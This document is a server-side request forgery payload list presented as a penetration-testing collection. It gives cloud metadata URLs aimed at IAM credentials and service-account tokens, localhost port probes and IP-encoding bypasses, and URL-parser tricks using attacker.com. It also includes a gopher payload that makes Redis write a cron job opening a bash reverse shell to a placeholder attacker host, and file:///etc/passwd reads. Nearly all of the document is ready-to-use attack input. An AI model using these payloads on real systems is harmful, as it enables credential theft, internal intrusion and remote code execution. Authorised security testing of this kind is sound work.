## ============================================================
## SSRF Payloads — Real-World VAPT Collection
## ============================================================

## ---- AWS METADATA (IMDSv1) ----
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

## ---- AWS IMDSv2 (requires token — test if accessible without) ----
# Step 1: Get token
# curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: Use token
# curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/

## ---- GCP METADATA ----
http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/
http://169.254.169.254/computeMetadata/v1/instance/hostname
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Note: GCP requires header Metadata-Flavor: Google

## ---- AZURE METADATA ----
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
# Note: Azure requires header Metadata: true

## ---- DIGITALOCEAN METADATA ----
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data

## ---- ALIBABA CLOUD ----
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

## ---- KUBERNETES ----
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets
http://10.0.0.1:443/api/v1/namespaces

## ---- INTERNAL SERVICE PROBING ----
http://127.0.0.1
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:9200
http://127.0.0.1:27017
http://localhost
http://0.0.0.0
http://[::1]
http://[0000::1]
http://0
http://0177.0.0.1
http://2130706433
http://017700000001
http://0x7f000001
http://0x7f.0x0.0x0.0x1
http://10.0.0.0/8
http://172.16.0.0/12
http://192.168.0.0/16

## ---- PROTOCOL SMUGGLING ----
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0a%0a%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
gopher://127.0.0.1:3306/_%01%00%00%01%85%a6%03%00%00%00%00%01
dict://127.0.0.1:6379/INFO
file:///etc/passwd
file:///C:/Windows/win.ini
ftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/test

## ---- IP BYPASS TECHNIQUES ----
# Decimal
http://2130706433 (= 127.0.0.1)
http://3232235521 (= 192.168.0.1)
# Hex
http://0x7f000001 (= 127.0.0.1)
http://0x7f.0x0.0x0.0x1
# Octal
http://0177.0.0.1 (= 127.0.0.1)
http://0177.0000.0000.0001
# IPv6
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
# Short forms
http://127.1
http://127.0.1
http://0
# Mixed
http://①②⑦.⓪.⓪.① (unicode)
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net

## ---- URL PARSER CONFUSION ----
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1%23@attacker.com
http://attacker.com\@127.0.0.1
http://127.0.0.1:80\@attacker.com
http://127.0.0.1%00@attacker.com
http://attacker.com%00127.0.0.1
http://[::1]:80/
http://127.0.0.1/\..
http://attacker.com/redirect?url=http://169.254.169.254/latest/

## ---- DNS REBINDING ----
# Use a DNS rebinding service that alternates between attacker IP and 127.0.0.1
# Tools: rbndr.us, singularity, rebinder
http://7f000001.c0a80001.rbndr.us (alternates 127.0.0.1 <-> 192.168.0.1)

## ---- OOB DETECTION ----
# Use Burp Collaborator / interactsh / webhook.site
http://COLLABORATOR_URL
https://COLLABORATOR_URL
http://COLLABORATOR_URL/ssrf-test
